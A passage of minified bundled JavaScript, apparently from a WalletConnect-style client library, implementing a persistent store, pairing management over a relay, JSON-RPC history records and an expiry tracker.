            const s = (r = null !== r && void 0 !== r ? r : new Map).get(e)
              , a = r.get(t);
            if (null != s && null != a)
                return s === t;
            r.set(e, t),
            r.set(t, e);
            try {
                switch (o) {
                case "[object Map]":
                    if (e.size !== t.size)
                        return !1;
                    for (const [o,i] of e.entries())
                        if (!t.has(o) || !nT(i, t.get(o), o, e, t, r, n))
                            return !1;
                    return !0;
                case "[object Set]":
                    {
                        if (e.size !== t.size)
                            return !1;
                        const o = Array.from(e.values())
                          , i = Array.from(t.values());
                        for (let s = 0; s < o.length; s++) {
                            const a = o[s]
                              , c = i.findIndex((o => nT(a, o, void 0, e, t, r, n)));
                            if (-1 === c)
                                return !1;
                            i.splice(c, 1)
                        }
                        return !0
                    }
                case "[object Array]":
                case "[object Uint8Array]":
                case "[object Uint8ClampedArray]":
                case "[object Uint16Array]":
                case "[object Uint32Array]":
                case "[object BigUint64Array]":
                case "[object Int8Array]":
                case "[object Int16Array]":
                case "[object Int32Array]":
                case "[object BigInt64Array]":
                case "[object Float32Array]":
                case "[object Float64Array]":
                    if (typeof Buffer < "u" && Buffer.isBuffer(e) !== Buffer.isBuffer(t) || e.length !== t.length)
                        return !1;
                    for (let o = 0; o < e.length; o++)
                        if (!nT(e[o], t[o], o, e, t, r, n))
                            return !1;
                    return !0;
                case "[object ArrayBuffer]":
                    return e.byteLength === t.byteLength && oT(new Uint8Array(e), new Uint8Array(t), r, n);
                case "[object DataView]":
                    return e.byteLength === t.byteLength && e.byteOffset === t.byteOffset && oT(new Uint8Array(e), new Uint8Array(t), r, n);
                case "[object Error]":
                    return e.name === t.name && e.message === t.message;
                case tT:
                    {
                        if (!(oT(e.constructor, t.constructor, r, n) || rT(e) && rT(t)))
                            return !1;
                        const o = [...Object.keys(e), ...Xw(e)]
                          , i = [...Object.keys(t), ...Xw(t)];
                        if (o.length !== i.length)
                            return !1;
                        for (let s = 0; s < o.length; s++) {
                            const i = o[s]
                              , a = e[i];
                            if (!Object.hasOwn(t, i))
                                return !1;
                            if (!nT(a, t[i], i, e, t, r, n))
                                return !1
                        }
                        return !0
                    }
                default:
                    return !1
                }
            } finally {
                r.delete(e),
                r.delete(t)
            }
        }
        function iT() {}
        function sT(e, t) {
            return function(e, t, r) {
                return nT(e, t, void 0, void 0, void 0, void 0, r)
            }(e, t, iT)
        }
        var aT = Object.defineProperty
          , cT = Object.getOwnPropertySymbols
          , lT = Object.prototype.hasOwnProperty
          , uT = Object.prototype.propertyIsEnumerable
          , dT = (e, t, r) => t in e ? aT(e, t, {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: r
        }) : e[t] = r
          , hT = (e, t) => {
            for (var r in t || (t = {}))
                lT.call(t, r) && dT(e, r, t[r]);
            if (cT)
                for (var r of cT(t))
                    uT.call(t, r) && dT(e, r, t[r]);
            return e
        }
          , fT = (e, t, r) => dT(e, "symbol" != typeof t ? t + "" : t, r);
        class pT extends qt {
            constructor(e, t, r) {
                let n = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : $y
                  , o = arguments.length > 4 && void 0 !== arguments[4] ? arguments[4] : void 0;
                super(e, t, r, n),
                this.core = e,
                this.logger = t,
                this.name = r,
                fT(this, "map", new Map),
                fT(this, "version", "0.3"),
                fT(this, "cached", []),
                fT(this, "initialized", !1),
                fT(this, "getKey"),
                fT(this, "storagePrefix", $y),
                fT(this, "recentlyDeleted", []),
                fT(this, "recentlyDeletedLimit", 200),
                fT(this, "init", (async () => {
                    this.initialized || (this.logger.trace("Initialized"),
                    await this.restore(),
                    this.cached.forEach((e => {
                        this.getKey && null !== e && !zg(e) ? this.map.set(this.getKey(e), e) : function(e) {
                            var t;
                            return null == (t = null === e || void 0 === e ? void 0 : e.proposer) ? void 0 : t.publicKey
                        }(e) ? this.map.set(e.id, e) : function(e) {
                            return null === e || void 0 === e ? void 0 : e.topic
                        }(e) && this.map.set(e.topic, e)
                    }
                    )),
                    this.cached = [],
                    this.initialized = !0)
                }
                )),
                fT(this, "set", (async (e, t) => {
                    this.isInitialized(),
                    this.map.has(e) ? await this.update(e, t) : (this.logger.debug("Setting value"),
                    this.logger.trace({
                        type: "method",
                        method: "set",
                        key: e,
                        value: t
                    }),
                    this.map.set(e, t),
                    await this.persist())
                }
                )),
                fT(this, "get", (e => (this.isInitialized(),
                this.logger.debug("Getting value"),
                this.logger.trace({
                    type: "method",
                    method: "get",
                    key: e
                }),
                this.getData(e)))),
                fT(this, "getAll", (e => (this.isInitialized(),
                e ? this.values.filter((t => Object.keys(e).every((r => sT(t[r], e[r]))))) : this.values))),
                fT(this, "update", (async (e, t) => {
                    this.isInitialized(),
                    this.logger.debug("Updating value"),
                    this.logger.trace({
                        type: "method",
                        method: "update",
                        key: e,
                        update: t
                    });
                    const r = hT(hT({}, this.getData(e)), t);
                    this.map.set(e, r),
                    await this.persist()
                }
                )),
                fT(this, "delete", (async (e, t) => {
                    this.isInitialized(),
                    this.map.has(e) && (this.logger.debug("Deleting value"),
                    this.logger.trace({
                        type: "method",
                        method: "delete",
                        key: e,
                        reason: t
                    }),
                    this.map.delete(e),
                    this.addToRecentlyDeleted(e),
                    await this.persist())
                }
                )),
                this.logger = kt(t, this.name),
                this.storagePrefix = n,
                this.getKey = o
            }
            get context() {
                return Rt(this.logger)
            }
            get storageKey() {
                return this.storagePrefix + this.version + this.core.customStoragePrefix + "//" + this.name
            }
            get length() {
                return this.map.size
            }
            get keys() {
                return Array.from(this.map.keys())
            }
            get values() {
                return Array.from(this.map.values())
            }
            addToRecentlyDeleted(e) {
                this.recentlyDeleted.push(e),
                this.recentlyDeleted.length >= this.recentlyDeletedLimit && this.recentlyDeleted.splice(0, this.recentlyDeletedLimit / 2)
            }
            async setDataStore(e) {
                await this.core.storage.setItem(this.storageKey, e)
            }
            async getDataStore() {
                return await this.core.storage.getItem(this.storageKey)
            }
            getData(e) {
                const t = this.map.get(e);
                if (!t) {
                    if (this.recentlyDeleted.includes(e)) {
                        const {message: t} = Ug("MISSING_OR_INVALID", "Record was recently deleted - ".concat(this.name, ": ").concat(e));
                        throw this.logger.error(t),
                        new Error(t)
                    }
                    const {message: t} = Ug("NO_MATCHING_KEY", "".concat(this.name, ": ").concat(e));
                    throw this.logger.error(t),
                    new Error(t)
                }
                return t
            }
            async persist() {
                await this.setDataStore(this.values)
            }
            async restore() {
                try {
                    const e = await this.getDataStore();
                    if (typeof e > "u" || !e.length)
                        return;
                    if (this.map.size) {
                        const {message: e} = Ug("RESTORE_WILL_OVERRIDE", this.name);
                        throw this.logger.error(e),
                        new Error(e)
                    }
                    this.cached = e,
                    this.logger.debug("Successfully Restored value for ".concat(this.name)),
                    this.logger.trace({
                        type: "method",
                        method: "restore",
                        value: this.values
                    })
                } catch (_l) {
                    this.logger.debug("Failed to Restore value for ".concat(this.name)),
                    this.logger.error(_l)
                }
            }
            isInitialized() {
                if (!this.initialized) {
                    const {message: e} = Ug("NOT_INITIALIZED", this.name);
                    throw new Error(e)
                }
            }
        }
        var gT = Object.defineProperty
          , yT = (e, t, r) => ( (e, t, r) => t in e ? gT(e, t, {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: r
        }) : e[t] = r)(e, "symbol" != typeof t ? t + "" : t, r);
        class mT {
            constructor(e, t) {
                this.core = e,
                this.logger = t,
                yT(this, "name", "pairing"),
                yT(this, "version", "0.3"),
                yT(this, "events", new (Ie())),
                yT(this, "pairings"),
                yT(this, "initialized", !1),
                yT(this, "storagePrefix", $y),
                yT(this, "ignoredPayloadTypes", [1]),
                yT(this, "registeredMethods", []),
                yT(this, "init", (async () => {
                    this.initialized || (await this.pairings.init(),
                    await this.cleanup(),
                    this.registerRelayerEvents(),
                    this.registerExpirerEvents(),
                    this.initialized = !0,
                    this.logger.trace("Initialized"))
                }
                )),
                yT(this, "register", (e => {
                    let {methods: t} = e;
                    this.isInitialized(),
                    this.registeredMethods = [...new Set([...this.registeredMethods, ...t])]
                }
                )),
                yT(this, "create", (async e => {
                    this.isInitialized();
                    const t = rg()
                      , r = await this.core.crypto.setSymKey(t)
                      , n = hu(Be.FIVE_MINUTES)
                      , o = {
                        protocol: "irn"
                    }
                      , i = {
                        topic: r,
                        expiry: n,
                        relay: o,
                        active: !1,
                        methods: null === e || void 0 === e ? void 0 : e.methods
                    }
                      , s = wg({
                        protocol: this.core.protocol,
                        version: this.core.version,
                        topic: r,
                        symKey: t,
                        relay: o,
                        expiryTimestamp: n,
                        methods: null === e || void 0 === e ? void 0 : e.methods
                    });
                    return this.events.emit(Tm, i),
                    this.core.expirer.set(r, n),
                    await this.pairings.set(r, i),
                    await this.core.relayer.subscribe(r, {
                        transportType: null === e || void 0 === e ? void 0 : e.transportType
                    }),
                    {
                        topic: r,
                        uri: s
                    }
                }
                )),
                yT(this, "pair", (async e => {
                    this.isInitialized();
                    const t = this.core.eventClient.createEvent({
                        properties: {
                            topic: null === e || void 0 === e ? void 0 : e.uri,
                            trace: [Fm]
                        }
                    });
                    this.isValidPair(e, t);
                    const {topic: r, symKey: n, relay: o, expiryTimestamp: i, methods: s} = bg(e.uri);
                    let a;
                    if (t.props.properties.topic = r,
                    t.addTrace(Um),
                    t.addTrace(Dm),
                    this.pairings.keys.includes(r)) {
                        if (a = this.pairings.get(r),
                        t.addTrace(Vm),
                        a.active)
                            throw t.setError(Zm),
                            new Error("Pairing already exists: ".concat(r, ". Please try again with a new connection URI."));
                        t.addTrace(Hm)
                    }
                    const c = i || hu(Be.FIVE_MINUTES)
                      , l = {
                        topic: r,
                        relay: o,
                        expiry: c,
                        active: !1,
                        methods: s
                    };
                    this.core.expirer.set(r, c),
                    await this.pairings.set(r, l),
                    t.addTrace(Lm),
                    e.activatePairing && await this.activate({
                        topic: r
                    }),
                    this.events.emit(Tm, l),
                    t.addTrace(qm),
                    this.core.crypto.keychain.has(r) || await this.core.crypto.setSymKey(n, r),
                    t.addTrace(jm);
                    try {
                        await this.core.relayer.confirmOnlineStateOrThrow()
                    } catch (u) {
                        t.setError($m)
                    }
                    try {
                        await this.core.relayer.subscribe(r, {
                            relay: o
                        })
                    } catch (st) {
                        throw t.setError(Ym),
                        st
                    }
                    return t.addTrace(zm),
                    l
                }
                )),
                yT(this, "activate", (async e => {
                    let {topic: t} = e;
                    this.isInitialized();
                    const r = hu(Be.FIVE_MINUTES);
                    this.core.expirer.set(t, r),
                    await this.pairings.update(t, {
                        active: !0,
                        expiry: r
                    })
                }
                )),
                yT(this, "ping", (async e => {
                    this.isInitialized(),
                    await this.isValidPing(e),
                    this.logger.warn("ping() is deprecated and will be removed in the next major release.");
                    const {topic: t} = e;
                    if (this.pairings.keys.includes(t)) {
                        const e = await this.sendRequest(t, "wc_pairingPing", {})
                          , {done: r, resolve: n, reject: o} = cu();
                        this.events.once(pu("pairing_ping", e), (e => {
                            let {error: t} = e;
                            t ? o(t) : n()
                        }
                        )),
                        await r()
                    }
                }
                )),
                yT(this, "updateExpiry", (async e => {
                    let {topic: t, expiry: r} = e;
                    this.isInitialized(),
                    await this.pairings.update(t, {
                        expiry: r
                    })
                }
                )),
                yT(this, "updateMetadata", (async e => {
                    let {topic: t, metadata: r} = e;
                    this.isInitialized(),
                    await this.pairings.update(t, {
                        peerMetadata: r
                    })
                }
                )),
                yT(this, "getPairings", ( () => (this.isInitialized(),
                this.pairings.values))),
                yT(this, "disconnect", (async e => {
                    this.isInitialized(),
                    await this.isValidDisconnect(e);
                    const {topic: t} = e;
                    this.pairings.keys.includes(t) && (await this.sendRequest(t, "wc_pairingDelete", Dg("USER_DISCONNECTED")),
                    await this.deletePairing(t))
                }
                )),
                yT(this, "formatUriFromPairing", (e => {
                    this.isInitialized();
                    const {topic: t, relay: r, expiry: n, methods: o} = e
                      , i = this.core.crypto.keychain.get(t);
                    return wg({
                        protocol: this.core.protocol,
                        version: this.core.version,
                        topic: t,
                        symKey: i,
                        relay: r,
                        expiryTimestamp: n,
                        methods: o
                    })
                }
                )),
                yT(this, "sendRequest", (async (e, t, r) => {
                    const n = Iy(t, r)
                      , o = await this.core.crypto.encode(e, n)
                      , i = wm[t].req;
                    return this.core.history.set(e, n),
                    this.core.relayer.publish(e, o, i),
                    n.id
                }
                )),
                yT(this, "sendResult", (async (e, t, r) => {
                    const n = By(e, r)
                      , o = await this.core.crypto.encode(t, n)
                      , i = (await this.core.history.get(t, e)).request.method
                      , s = wm[i].res;
                    await this.core.relayer.publish(t, o, s),
                    await this.core.history.resolve(n)
                }
                )),
                yT(this, "sendError", (async (e, t, r) => {
                    const n = xy(e, r)
                      , o = await this.core.crypto.encode(t, n)
                      , i = (await this.core.history.get(t, e)).request.method
                      , s = wm[i] ? wm[i].res : wm.unregistered_method.res;
                    await this.core.relayer.publish(t, o, s),
                    await this.core.history.resolve(n)
                }
                )),
                yT(this, "deletePairing", (async (e, t) => {
                    await this.core.relayer.unsubscribe(e),
                    await Promise.all([this.pairings.delete(e, Dg("USER_DISCONNECTED")), this.core.crypto.deleteSymKey(e), t ? Promise.resolve() : this.core.expirer.del(e)])
                }
                )),
                yT(this, "cleanup", (async () => {
                    const e = this.pairings.getAll().filter((e => fu(e.expiry)));
                    await Promise.all(e.map((e => this.deletePairing(e.topic))))
                }
                )),
                yT(this, "onRelayEventRequest", (async e => {
                    const {topic: t, payload: r} = e;
                    switch (r.method) {
                    case "wc_pairingPing":
                        return await this.onPairingPingRequest(t, r);
                    case "wc_pairingDelete":
                        return await this.onPairingDeleteRequest(t, r);
                    default:
                        return await this.onUnknownRpcMethodRequest(t, r)
                    }
                }
                )),
                yT(this, "onRelayEventResponse", (async e => {
                    const {topic: t, payload: r} = e
                      , n = (await this.core.history.get(t, r.id)).request.method;
                    return "wc_pairingPing" === n ? this.onPairingPingResponse(t, r) : this.onUnknownRpcMethodResponse(n)
                }
                )),
                yT(this, "onPairingPingRequest", (async (e, t) => {
                    const {id: r} = t;
                    try {
                        this.isValidPing({
                            topic: e
                        }),
                        await this.sendResult(r, e, !0),
                        this.events.emit(Pm, {
                            id: r,
                            topic: e
                        })
                    } catch (n) {
                        await this.sendError(r, e, n),
                        this.logger.error(n)
                    }
                }
                )),
                yT(this, "onPairingPingResponse", ( (e, t) => {
                    const {id: r} = t;
                    setTimeout(( () => {
                        Ly(t) ? this.events.emit(pu("pairing_ping", r), {}) : jy(t) && this.events.emit(pu("pairing_ping", r), {
                            error: t.error
                        })
                    }
                    ), 500)
                }
                )),
                yT(this, "onPairingDeleteRequest", (async (e, t) => {
                    const {id: r} = t;
                    try {
                        this.isValidDisconnect({
                            topic: e
                        }),
                        await this.deletePairing(e),
                        this.events.emit(Em, {
                            id: r,
                            topic: e
                        })
                    } catch (n) {
                        await this.sendError(r, e, n),
                        this.logger.error(n)
                    }
                }
                )),
                yT(this, "onUnknownRpcMethodRequest", (async (e, t) => {
                    const {id: r, method: n} = t;
                    try {
                        if (this.registeredMethods.includes(n))
                            return;
                        const t = Dg("WC_METHOD_UNSUPPORTED", n);
                        await this.sendError(r, e, t),
                        this.logger.error(t)
                    } catch (Nt) {
                        await this.sendError(r, e, Nt),
                        this.logger.error(Nt)
                    }
                }
                )),
                yT(this, "onUnknownRpcMethodResponse", (e => {
                    this.registeredMethods.includes(e) || this.logger.error(Dg("WC_METHOD_UNSUPPORTED", e))
                }
                )),
                yT(this, "isValidPair", ( (e, t) => {
                    var r;
                    if (!Xg(e)) {
                        const {message: r} = Ug("MISSING_OR_INVALID", "pair() params: ".concat(e));
                        throw t.setError(Km),
                        new Error(r)
                    }
                    if (!function(e) {
                        function t(e) {
                            try {
                                return typeof new URL(e) < "u"
                            } catch (t) {
                                return !1
                            }
                        }
                        try {
                            if (Vg(e, !1))
                                return !!t(e) || t(wu(e))
                        } catch (r) {}
                        return !1
                    }(e.uri)) {
                        const {message: r} = Ug("MISSING_OR_INVALID", "pair() uri: ".concat(e.uri));
                        throw t.setError(Km),
                        new Error(r)
                    }
                    const n = bg(null === e || void 0 === e ? void 0 : e.uri);
                    if (null == (r = null === n || void 0 === n ? void 0 : n.relay) || !r.protocol) {
                        const {message: e} = Ug("MISSING_OR_INVALID", "pair() uri#relay-protocol");
                        throw t.setError(Km),
                        new Error(e)
                    }
                    if (null == n || !n.symKey) {
                        const {message: e} = Ug("MISSING_OR_INVALID", "pair() uri#symKey");
                        throw t.setError(Km),
                        new Error(e)
                    }
                    if (null != n && n.expiryTimestamp && (0,
                    Be.toMiliseconds)(null === n || void 0 === n ? void 0 : n.expiryTimestamp) < Date.now()) {
                        t.setError(Jm);
                        const {message: e} = Ug("EXPIRED", "pair() URI has expired. Please try again with a new connection URI.");
                        throw new Error(e)
                    }
                }
                )),
                yT(this, "isValidPing", (async e => {
                    if (!Xg(e)) {
                        const {message: t} = Ug("MISSING_OR_INVALID", "ping() params: ".concat(e));
                        throw new Error(t)
                    }
                    const {topic: t} = e;
                    await this.isValidPairingTopic(t)
                }
                )),
                yT(this, "isValidDisconnect", (async e => {
                    if (!Xg(e)) {
                        const {message: t} = Ug("MISSING_OR_INVALID", "disconnect() params: ".concat(e));
                        throw new Error(t)
                    }
                    const {topic: t} = e;
                    await this.isValidPairingTopic(t)
                }
                )),
                yT(this, "isValidPairingTopic", (async e => {
                    if (!Vg(e, !1)) {
                        const {message: t} = Ug("MISSING_OR_INVALID", "pairing topic should be a string: ".concat(e));
                        throw new Error(t)
                    }
                    if (!this.pairings.keys.includes(e)) {
                        const {message: t} = Ug("NO_MATCHING_KEY", "pairing topic doesn't exist: ".concat(e));
                        throw new Error(t)
                    }
                    if (fu(this.pairings.get(e).expiry)) {
                        await this.deletePairing(e);
                        const {message: t} = Ug("EXPIRED", "pairing topic: ".concat(e));
                        throw new Error(t)
                    }
                }
                )),
                this.core = e,
                this.logger = kt(t, this.name),
                this.pairings = new pT(this.core,this.logger,this.name,this.storagePrefix)
            }
            get context() {
                return Rt(this.logger)
            }
            isInitialized() {
                if (!this.initialized) {
                    const {message: e} = Ug("NOT_INITIALIZED", this.name);
                    throw new Error(e)
                }
            }
            registerRelayerEvents() {
                this.core.relayer.on(em, (async e => {
                    const {topic: t, message: r, transportType: n} = e;
                    if (this.pairings.keys.includes(t) && n !== hm.link_mode && !this.ignoredPayloadTypes.includes(this.core.crypto.getPayloadType(r)))
                        try {
                            const e = await this.core.crypto.decode(t, r);
                            Uy(e) ? (this.core.history.set(t, e),
                            await this.onRelayEventRequest({
                                topic: t,
                                payload: e
                            })) : Dy(e) && (await this.core.history.resolve(e),
                            await this.onRelayEventResponse({
                                topic: t,
                                payload: e
                            }),
                            this.core.history.delete(t, e.id)),
                            await this.core.relayer.messages.ack(t, r)
                        } catch (Oe) {
                            this.logger.error(Oe)
                        }
                }
                ))
            }
            registerExpirerEvents() {
                this.core.expirer.on(_m, (async e => {
                    const {topic: t} = du(e.target);
                    t && this.pairings.keys.includes(t) && (await this.deletePairing(t, !0),
                    this.events.emit(Am, {
                        topic: t
                    }))
                }
                ))
            }
        }
        var bT = Object.defineProperty
          , vT = (e, t, r) => ( (e, t, r) => t in e ? bT(e, t, {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: r
        }) : e[t] = r)(e, "symbol" != typeof t ? t + "" : t, r);
        class wT extends jt {
            constructor(e, t) {
                super(e, t),
                this.core = e,
                this.logger = t,
                vT(this, "records", new Map),
                vT(this, "events", new Se.EventEmitter),
                vT(this, "name", "history"),
                vT(this, "version", "0.3"),
                vT(this, "cached", []),
                vT(this, "initialized", !1),
                vT(this, "storagePrefix", $y),
                vT(this, "init", (async () => {
                    this.initialized || (this.logger.trace("Initialized"),
                    await this.restore(),
                    this.cached.forEach((e => this.records.set(e.id, e))),
                    this.cached = [],
                    this.registerEventListeners(),
                    this.initialized = !0)
                }
                )),
                vT(this, "set", ( (e, t, r) => {
                    if (this.isInitialized(),
                    this.logger.debug("Setting JSON-RPC request history record"),
                    this.logger.trace({
                        type: "method",
                        method: "set",
                        topic: e,
                        request: t,
                        chainId: r
                    }),
                    this.records.has(t.id))
                        return;
                    const n = {
                        id: t.id,
                        topic: e,
                        request: {
                            method: t.method,
                            params: t.params || null
                        },
                        chainId: r,
                        expiry: hu(Be.THIRTY_DAYS)
                    };
                    this.records.set(n.id, n),
                    this.persist(),
                    this.events.emit(Cm, n)
                }
                )),
                vT(this, "resolve", (async e => {
                    if (this.isInitialized(),
                    this.logger.debug("Updating JSON-RPC response history record"),
                    this.logger.trace({
                        type: "method",
                        method: "update",
                        response: e
                    }),
                    !this.records.has(e.id))
                        return;
                    const t = await this.getRecord(e.id);
                    typeof t.response > "u" && (t.response = jy(e) ? {
                        error: e.error
                    } : {
                        result: e.result
                    },
                    this.records.set(t.id, t),
                    this.persist(),
                    this.events.emit(Sm, t))
                }
                )),
                vT(this, "get", (async (e, t) => (this.isInitialized(),
                this.logger.debug("Getting record"),
                this.logger.trace({
                    type: "method",
                    method: "get",
                    topic: e,
                    id: t
                }),
                await this.getRecord(t)))),
                vT(this, "delete", ( (e, t) => {
                    this.isInitialized(),
                    this.logger.debug("Deleting record"),
                    this.logger.trace({
                        type: "method",
                        method: "delete",
                        id: t
                    }),
                    this.values.forEach((r => {
                        if (r.topic === e) {
                            if (typeof t < "u" && r.id !== t)
                                return;
                            this.records.delete(r.id),
                            this.events.emit(Im, r)
                        }
                    }
                    )),
                    this.persist()
                }
                )),
                vT(this, "exists", (async (e, t) => (this.isInitialized(),
                !!this.records.has(t) && (await this.getRecord(t)).topic === e))),
                vT(this, "on", ( (e, t) => {
                    this.events.on(e, t)
                }
                )),
                vT(this, "once", ( (e, t) => {
                    this.events.once(e, t)
                }
                )),
                vT(this, "off", ( (e, t) => {
                    this.events.off(e, t)
                }
                )),
                vT(this, "removeListener", ( (e, t) => {
                    this.events.removeListener(e, t)
                }
                )),
                this.logger = kt(t, this.name)
            }
            get context() {
                return Rt(this.logger)
            }
            get storageKey() {
                return this.storagePrefix + this.version + this.core.customStoragePrefix + "//" + this.name
            }
            get size() {
                return this.records.size
            }
            get keys() {
                return Array.from(this.records.keys())
            }
            get values() {
                return Array.from(this.records.values())
            }
            get pending() {
                const e = [];
                return this.values.forEach((t => {
                    if (typeof t.response < "u")
                        return;
                    const r = {
                        topic: t.topic,
                        request: Iy(t.request.method, t.request.params, t.id),
                        chainId: t.chainId
                    };
                    return e.push(r)
                }
                )),
                e
            }
            async setJsonRpcRecords(e) {
                await this.core.storage.setItem(this.storageKey, e)
            }
            async getJsonRpcRecords() {
                return await this.core.storage.getItem(this.storageKey)
            }
            getRecord(e) {
                this.isInitialized();
                const t = this.records.get(e);
                if (!t) {
                    const {message: t} = Ug("NO_MATCHING_KEY", "".concat(this.name, ": ").concat(e));
                    throw new Error(t)
                }
                return t
            }
            async persist() {
                await this.setJsonRpcRecords(this.values),
                this.events.emit(Bm)
            }
            async restore() {
                try {
                    const e = await this.getJsonRpcRecords();
                    if (typeof e > "u" || !e.length)
                        return;
                    if (this.records.size) {
                        const {message: e} = Ug("RESTORE_WILL_OVERRIDE", this.name);
                        throw this.logger.error(e),
                        new Error(e)
                    }
                    this.cached = e,
                    this.logger.debug("Successfully Restored records for ".concat(this.name)),
                    this.logger.trace({
                        type: "method",
                        method: "restore",
                        records: this.values
                    })
                } catch (_l) {
                    this.logger.debug("Failed to Restore records for ".concat(this.name)),
                    this.logger.error(_l)
                }
            }
            registerEventListeners() {
                this.events.on(Cm, (e => {
                    const t = Cm;
                    this.logger.info("Emitting ".concat(t)),
                    this.logger.debug({
                        type: "event",
                        event: t,
                        record: e
                    })
                }
                )),
                this.events.on(Sm, (e => {
                    const t = Sm;
                    this.logger.info("Emitting ".concat(t)),
                    this.logger.debug({
                        type: "event",
                        event: t,
                        record: e
                    })
                }
                )),
                this.events.on(Im, (e => {
                    const t = Im;
                    this.logger.info("Emitting ".concat(t)),
                    this.logger.debug({
                        type: "event",
                        event: t,
                        record: e
                    })
                }
                )),
                this.core.heartbeat.on(We, ( () => {
                    this.cleanup()
                }
                ))
            }
            cleanup() {
                try {
                    this.isInitialized();
                    let e = !1;
                    this.records.forEach((t => {
                        (0,
                        Be.toMiliseconds)(t.expiry || 0) - Date.now() <= 0 && (this.logger.info("Deleting expired history log: ".concat(t.id)),
                        this.records.delete(t.id),
                        this.events.emit(Im, t, !1),
                        e = !0)
                    }
                    )),
                    e && this.persist()
                } catch (_l) {
                    this.logger.warn(_l)
                }
            }
            isInitialized() {
                if (!this.initialized) {
                    const {message: e} = Ug("NOT_INITIALIZED", this.name);
                    throw new Error(e)
                }
            }
        }
        var TT = Object.defineProperty
          , AT = (e, t, r) => ( (e, t, r) => t in e ? TT(e, t, {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: r
        }) : e[t] = r)(e, "symbol" != typeof t ? t + "" : t, r);
        class ET extends $t {
            constructor(e, t) {
                super(e, t),
                this.core = e,
                this.logger = t,
                AT(this, "expirations", new Map),
                AT(this, "events", new Se.EventEmitter),
                AT(this, "name", "expirer"),
                AT(this, "version", "0.3"),
                AT(this, "cached", []),
                AT(this, "initialized", !1),
                AT(this, "storagePrefix", $y),
                AT(this, "init", (async () => {
                    this.initialized || (this.logger.trace("Initialized"),
                    await this.restore(),
                    this.cached.forEach((e => this.expirations.set(e.target, e))),
                    this.cached = [],
                    this.registerEventListeners(),
                    this.initialized = !0)
                }
                )),
                AT(this, "has", (e => {
                    try {
                        const t = this.formatTarget(e);
                        return typeof this.getExpiration(t) < "u"
                    } catch (t) {
                        return !1
                    }
                }
                )),
                AT(this, "set", ( (e, t) => {
                    this.isInitialized();
                    const r = this.formatTarget(e)
                      , n = {
                        target: r,
                        expiry: t
                    };
                    this.expirations.set(r, n),
                    this.checkExpiry(r, n),
                    this.events.emit(xm, {
                        target: r,
                        expiration: n
                    })
                }
                )),
                AT(this, "get", (e => {
                    this.isInitialized();
                    const t = this.formatTarget(e);
                    return this.getExpiration(t)
                }
                )),
                AT(this, "del", (e => {
                    if (this.isInitialized(),
                    this.has(e)) {
                        const t = this.formatTarget(e)
                          , r = this.getExpiration(t);
                        this.expirations.delete(t),
                        this.events.emit(Om, {
                            target: t,
                            expiration: r
                        })
                    }
                }
                )),
                AT(this, "on", ( (e, t) => {
                    this.events.on(e, t)
                }
                )),
                AT(this, "once", ( (e, t) => {
                    this.events.once(e, t)
                }
                )),
                AT(this, "off", ( (e, t) => {
                    this.events.off(e, t)
                }
                )),
                AT(this, "removeListener", ( (e, t) => {
                    this.events.removeListener(e, t)
                }
                )),
                this.logger = kt(t, this.name)
            }
            get context() {
                return Rt(this.logger)
            }
            get storageKey() {
                return this.storagePrefix + this.version + this.core.customStoragePrefix + "//" + this.name
            }
            get length() {
                return this.expirations.size
            }
            get keys() {
                return Array.from(this.expirations.keys())
            }
            get values() {
                return Array.from(this.expirations.values())
            }
            formatTarget(e) {
                if ("string" == typeof e)
                    return function(e) {
                        return uu("topic", e)
                    }(e);
                if ("number" == typeof e)
                    return function(e) {
                        return uu("id", e)
                    }(e);
                const {message: t} = Ug("UNKNOWN_TYPE", "Target type: ".concat(typeof e));
                throw new Error(t)
            }
            async setExpirations(e) {
                await this.core.storage.setItem(this.storageKey, e)
            }
            async getExpirations() {
                return await this.core.storage.getItem(this.storageKey)
            }
            async persist() {
                await this.setExpirations(this.values),
                this.events.emit(Wm)
            }
            async restore() {
                try {
                    const e = await this.getExpirations();
                    if (typeof e > "u" || !e.length)
                        return;
                    if (this.expirations.size) {
                        const {message: e} = Ug("RESTORE_WILL_OVERRIDE", this.name);
                        throw this.logger.error(e),
                        new Error(e)
                    }
                    this.cached = e,
                    this.logger.debug("Successfully Restored expirations for ".concat(this.name)),
                    this.logger.trace({
                        type: "method",
                        method: "restore",
                        expirations: this.values
                    })
                } catch (_l) {
                    this.logger.debug("Failed to Restore expirations for ".concat(this.name)),
                    this.logger.error(_l)
                }
            }
            getExpiration(e) {
                const t = this.expirations.get(e);
                if (!t) {
                    const {message: t} = Ug("NO_MATCHING_KEY", "".concat(this.name, ": ").concat(e));
                    throw this.logger.warn(t),
                    new Error(t)
                }
                return t
            }
            checkExpiry(e, t) {
                const {expiry: r} = t;
                (0,
                Be.toMiliseconds)(r) - Date.now() <= 0 && this.expire(e, t)
            }
            expire(e, t) {
                this.expirations.delete(e),
                this.events.emit(_m, {
                    target: e,
                    expiration: t
                })
            }
            checkExpirations() {
                this.core.relayer.connected && this.expirations.forEach(( (e, t) => this.checkExpiry(t, e)))
            }
            registerEventListeners() {
                this.core.heartbeat.on(We, ( () => this.checkExpirations())),
                this.events.on(xm, (e => {
                    const t = xm;
                    this.logger.info("Emitting ".concat(t)),
                    this.logger.debug({
                        type: "event",
                        event: t,
                        data: e
                    }),
                    this.persist()
                }
                )),
                this.events.on(_m, (e => {
                    const t = _m;
                    this.logger.info("Emitting ".concat(t)),
                    this.logger.debug({
                        type: "event",
                        event: t,
                        data: e
                    }),
                    this.persist()
                }
                )),
                this.events.on(Om, (e => {
                    const t = Om;
                    this.logger.info("Emitting ".concat(t)),
                    this.logger.debug({
                        type: "event",
                        event: t,
                        data: e
                    }),
                    this.persist()
                }
                ))
            }
            isInitialized() {
                if (!this.initialized) {
                    const {message: e} = Ug("NOT_INITIALIZED", this.name);
                    throw new Error(e)
                }
            }
        }
        var PT = Object.defineProperty
          , CT = (e, t, r) => ( (e, t, r) => t in e ? PT(e, t, {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: r
        }) : e[t] = r)(e, "symbol" != typeof t ? t + "" : t, r);
        class ST extends Kt {
            constructor(e, t, r) {
                super(e, t, r),
                this.core = e,
                this.logger = t,
                this.store = r,
                CT(this, "name", "verify-api"),
                CT(this, "abortController"),
                CT(this, "isDevEnv"),
                CT(this, "verifyUrlV3", Mm),
                CT(this, "storagePrefix", $y),
                CT(this, "version", 2),
